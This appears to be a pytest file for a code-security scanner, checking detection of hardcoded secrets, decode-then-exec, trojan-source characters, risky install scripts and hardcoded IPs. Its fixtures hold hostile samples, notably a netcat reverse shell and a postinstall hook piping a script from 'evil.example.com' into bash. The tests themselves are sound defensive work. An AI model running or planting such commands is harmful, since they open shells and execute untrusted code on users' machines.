from pathlib import Path

from codevalidator.models import ScanContext, ScannedFile
from codevalidator.scanners import dangerous_exec, network_exfil, obfuscation, secrets, supply_chain


def _ctx(rel_path: str, content: str) -> ScanContext:
    f = ScannedFile(path=Path("/tmp") / rel_path, rel_path=rel_path, content=content, size=len(content), mode=0o644)
    return ScanContext(repo_root=Path("/tmp"), files=[f])


def test_secrets_detects_aws_key():
    ctx = _ctx("app.py", 'KEY = "AKIAABCDEFGHIJKLMNOP"\n')
    findings = secrets.scan(ctx)
    assert any(f.category == "hardcoded-secret" for f in findings)


def test_secrets_ignores_env_lookup():
    ctx = _ctx("app.py", 'api_key = os.environ["API_KEY_PLACEHOLDER_VALUE_XXXXXXXXXXX"]\n')
    findings = secrets.scan(ctx)
    assert findings == []


def test_dangerous_exec_flags_decode_then_exec():
    ctx = _ctx("app.py", "code = base64.b64decode(payload)\nexec(code)\n")
    findings = dangerous_exec.scan(ctx)
    assert any(f.category == "obfuscated-payload-execution" and f.severity.name == "CRITICAL" for f in findings)


def test_dangerous_exec_flags_reverse_shell_netcat():
    ctx = _ctx("run.sh", "nc -e /bin/sh 10.0.0.1 4444\n")
    findings = dangerous_exec.scan(ctx)
    assert any(f.category == "reverse-shell" for f in findings)


def test_obfuscation_flags_bidi_control_char():
    evil = "if (" + chr(0x202E) + "true) {}"
    ctx = _ctx("app.js", evil)
    findings = obfuscation.scan(ctx)
    assert any(f.category == "trojan-source" for f in findings)


def test_obfuscation_ignores_low_entropy_long_string():
    ctx = _ctx("app.py", 'x = "' + "a" * 80 + '"\n')
    findings = obfuscation.scan(ctx)
    assert findings == []


def test_supply_chain_flags_postinstall_curl_pipe_bash():
    pkg = '{"name": "x", "scripts": {"postinstall": "curl http://evil.example.com/x.sh | bash"}}'
    ctx = _ctx("package.json", pkg)
    findings = supply_chain.scan(ctx)
    assert any(f.category == "install-time-script" and f.severity.name == "HIGH" for f in findings)


def test_network_exfil_ignores_rfc_section_reference():
    ctx = _ctx("RobotsParser.php", '// RFC 9309 §2.3.1.4: fail closed while robots.txt is unreachable\n')
    findings = network_exfil.scan(ctx)
    assert findings == []


def test_network_exfil_flags_hardcoded_ip():
    ctx = _ctx("beacon.py", 'HOST = "203.0.113.42:4444"  # phone home\n')
    findings = network_exfil.scan(ctx)
    assert any(f.category == "hardcoded-ip" for f in findings)


def test_supply_chain_ignores_benign_postinstall():
    pkg = '{"name": "x", "scripts": {"postinstall": "node ./scripts/build.js"}}'
    ctx = _ctx("package.json", pkg)
    findings = supply_chain.scan(ctx)
    assert all(f.severity.name != "HIGH" for f in findings)
